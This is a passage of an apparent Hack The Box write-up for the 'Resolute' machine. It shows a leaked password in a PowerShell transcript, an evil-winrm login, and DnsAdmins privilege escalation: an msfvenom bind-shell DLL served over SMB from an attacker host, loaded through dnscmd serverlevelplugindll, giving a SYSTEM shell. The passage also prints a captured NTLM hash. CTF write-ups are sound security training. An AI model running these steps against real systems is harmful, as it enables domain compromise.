+PS&gt;CommandInvocation(Invoke-Expression): "</span>Invoke-Expression<span class="s2">"
+&gt;&gt; ParameterBinding(Invoke-Expression): name="</span>Command<span class="s2">"; value="</span>cmd <span class="o">/</span>c net use X: <span class="se">\\</span>fs01<span class="se">\b</span>ackups ryan S....123!
+
+<span class="k">if</span> <span class="o">(!</span><span class="nv">$?</span><span class="o">)</span> <span class="o">{</span> <span class="k">if</span><span class="o">(</span><span class="nv">$LASTEXITCODE</span><span class="o">)</span> <span class="o">{</span> <span class="nb">exit</span> <span class="nv">$LASTEXITCODE</span> <span class="o">}</span> <span class="k">else</span> <span class="o">{</span> <span class="nb">exit </span><span class="m">1</span> <span class="o">}</span> <span class="o">}</span><span class="s2">"
+&gt;&gt; CommandInvocation(Out-String): "</span>Out-String<span class="s2">"
+&gt;&gt; ParameterBinding(Out-String): name="</span>Stream<span class="s2">"; value="</span>True<span class="s2">"
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK</span><span class="se">\r</span><span class="s2">yan
+RunAs User: MEGABANK</span><span class="se">\r</span><span class="s2">yan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\w</span><span class="s2">smprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+**********************
+Command start time: 20191203063515
+**********************
+PS&gt;CommandInvocation(Out-String): "</span>Out-String<span class="s2">"
+&gt;&gt; ParameterBinding(Out-String): name="</span>InputObject<span class="s2">"; value="</span>The syntax of this <span class="nb">command </span>is:<span class="s2">"
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: </span><span class="se">\\</span><span class="s2">fs01</span><span class="se">\b</span><span class="s2">ackups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: </span><span class="se">\\</span><span class="s2">fs01</span><span class="se">\b</span><span class="s2">ackups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK</span><span class="se">\r</span><span class="s2">yan
+RunAs User: MEGABANK</span><span class="se">\r</span><span class="s2">yan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\w</span><span class="s2">smprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************   </span></code></pre></figure>
+
+<p>Everyone seems to like using <em>123</em> in their passwords!</p>
+
+<p>In the file we can see that the transcript is for the user <code class="highlighter-rouge">ryan</code> and find another password.</p>
+
+<p>Let try accessing this new account:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">evil-winrm <span class="nt">-i</span> 10.10.10.169 <span class="nt">-u</span> ryan <span class="nt">-p</span> S....123!</code></pre></figure>
+
+<p>And we are in.</p>
+
+<h2 id="root">Root</h2>
+
+<p>Let’s waste no time in checking the users privileges:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /all
+
+USER INFORMATION
+<span class="nt">----------------</span>
+
+User Name     SID                                           
+<span class="o">=============</span> <span class="o">==============================================</span>
+megabank<span class="se">\r</span>yan S-1-5-21-1392959593-3013219662-3596683436-1105
+
+
+GROUP INFORMATION
+<span class="nt">-----------------</span>
+
+Group Name                                 Type             SID                                            Attributes                                                     
+<span class="o">==========================================</span> <span class="o">================</span> <span class="o">==============================================</span> <span class="o">===============================================================</span>
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group             
+BUILTIN<span class="se">\U</span>sers                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group             
+BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group             
+BUILTIN<span class="se">\R</span>emote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY<span class="se">\N</span>ETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY<span class="se">\A</span>uthenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY<span class="se">\T</span>his Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group             
+MEGABANK<span class="se">\C</span>ontractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group             
+MEGABANK<span class="se">\D</span>nsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY<span class="se">\N</span>TLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group             
+Mandatory Label<span class="se">\M</span>edium Mandatory Level     Label            S-1-16-8192                                                                                                   
+
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State  
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled</code></pre></figure>
+
+<p>We see that <code class="highlighter-rouge">ryan</code> is apart of the <code class="highlighter-rouge">DnsAdmins</code> group. A quick search online shows a way to escalate using <code class="highlighter-rouge">serverlevelplugindll</code> option in <code class="highlighter-rouge">dnscmd.exe</code>.</p>
+
+<p>There are two methods to accomplishing this. By using a <code class="highlighter-rouge">msfvenom</code> payload remotely (to avoid the AV) using impackets <code class="highlighter-rouge">smbserver.py</code> to host the <code class="highlighter-rouge">.dll</code>.</p>
+
+<p>Alternatively, you can create your own <code class="highlighter-rouge">.dll</code> to avoid the AV and host it locally (NOTE: It can also be used remotely but thats no fun!). You can follow this method <a href="/blog/dnsadmin-to-domain-controller-compromise/">here</a>.</p>
+
+<p>First we will use <code class="highlighter-rouge">msfvenom</code> and <code class="highlighter-rouge">metasploit</code>. Create our payload:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom <span class="nt">-p</span> windows/x64/shell_bind_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;attacker-ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;attacker-port&gt; <span class="nt">-f</span> dll <span class="o">&gt;</span> shell.dll
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 499 bytes
+Final size of dll file: 5120 bytes</code></pre></figure>
+
+<p>We then host the <code class="highlighter-rouge">.dll</code> via <code class="highlighter-rouge">smbserver</code> on the attacker machine:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">smbserver.py TMP /root/Shells/share
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed</code></pre></figure>
+
+<p>We then setup our <code class="highlighter-rouge">metasploit</code> handler:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/x64/shell_bind_tcp
+payload <span class="o">=&gt;</span> windows/x64/shell_bind_tcp
+msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lport 1234
+msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhost 10.10.10.169
+msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:
+
+   Name  Current Setting  Required  Description
+   <span class="nt">----</span>  <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+
+
+Payload options <span class="o">(</span>windows/x64/shell/bind_tcp<span class="o">)</span>:
+
+   Name      Current Setting  Required  Description
+   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   EXITFUNC  process          <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
+   LPORT     1234             <span class="nb">yes       </span>The listen port
+   RHOST     10.10.10.169     no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Wildcard Target
+
+msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started <span class="nb">bind </span>TCP handler against 10.10.10.169:1234
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>336 bytes<span class="o">)</span> to 10.10.10.169</code></pre></figure>
+
+<p>On the victim machine we then set our <code class="highlighter-rouge">.dll</code> to be loaded when the dns service is restarted.</p>
+
+<p>We then restart the service:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>ownloads&gt; dnscmd /config /serverlevelplugindll <span class="se">\\</span>10.10.14.40<span class="se">\T</span>MP<span class="se">\s</span>hell.dll
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+
+PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>ownloads&gt; sc.exe stop dns
+
+SERVICE_NAME: dns 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 3  STOP_PENDING 
+                                <span class="o">(</span>STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN<span class="o">)</span>
+        WIN32_EXIT_CODE    : 0  <span class="o">(</span>0x0<span class="o">)</span>
+        SERVICE_EXIT_CODE  : 0  <span class="o">(</span>0x0<span class="o">)</span>
+        CHECKPOINT         : 0x1
+        WAIT_HINT          : 0x7530
+PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>ownloads&gt; sc.exe start dns
+
+SERVICE_NAME: dns 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 2  START_PENDING 
+                                <span class="o">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span class="o">)</span>
+        WIN32_EXIT_CODE    : 0  <span class="o">(</span>0x0<span class="o">)</span>
+        SERVICE_EXIT_CODE  : 0  <span class="o">(</span>0x0<span class="o">)</span>
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 2756
+        FLAGS              : </code></pre></figure>
+
+<p>You will see in the <code class="highlighter-rouge">smbserver</code> output that <code class="highlighter-rouge">resolute</code> executes the <code class="highlighter-rouge">.dll</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.169,52935<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>MEGABANK<span class="se">\R</span>ESOLUTE<span class="nv">$,</span>RESOLUTE<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User RESOLUTE<span class="se">\R</span>ESOLUTE<span class="nv">$ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> RESOLUTE<span class="nv">$:</span>:MEGABANK:4141414141414141:398df5875fb62f7ce834603948ffcdaa:01010000000000008053f8ccb7afd501e85de9fe88e966db00000000010010004600590057006900770069007400460002001000700073004a0055006900480046004300030010004600590057006900770069007400460004001000700073004a0055006900480046004300070008008053f8ccb7afd501060004000200000008003000300000000000000000000000004000009be720f2b9f3b0f3138acd75092b55330464bd29d76a96706e41aceb9c94d64d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340030000000000000000000</code></pre></figure>
+
+<p>You should then see a session open with your metasploit handler:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.14.40:40671 -&gt; 10.10.10.169:1234<span class="o">)</span> at 2019-12-10 16:18:37 <span class="nt">-0800</span>
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+nt authority<span class="se">\s</span>ystem
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+e1d94876a5....b5405e619c</code></pre></figure>
+
+<p>Congrats! We have our root flag :)</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>This machine was pretty fun. I liked the fact that the privilege escalation to root used a system service that is deemed a “feature” by <em>Microsoft</em>. In a real world scenario it is common for multiple people to have access to group privileges relating to system services. So this machines scenario isn’t that far out of the realms of possibility.</p>
+<!-- Hack The Box Badge -->
+          <p class="text-center" style="padding-top: 10px;"><img src="https://www.hackthebox.eu/badge/image/195745" alt="Hack The Box"></p></main>
+      </div>
+    </div>
+    <!-- Bootstrap core JavaScript -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
+    <script src="/assets/js/bootstrap.bundle.min.js"></script>
+    <!-- Custom JavaScript -->
+    <script src="/assets/js/sabe.js"></script>
+    <!-- Lightbox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
+    <script>
+      $(document).on('click', '[data-toggle="lightbox"]', function(event) {
+        event.preventDefault();
+        $(this).ekkoLightbox();
+      });
+    </script>
+  </body>
+</html>
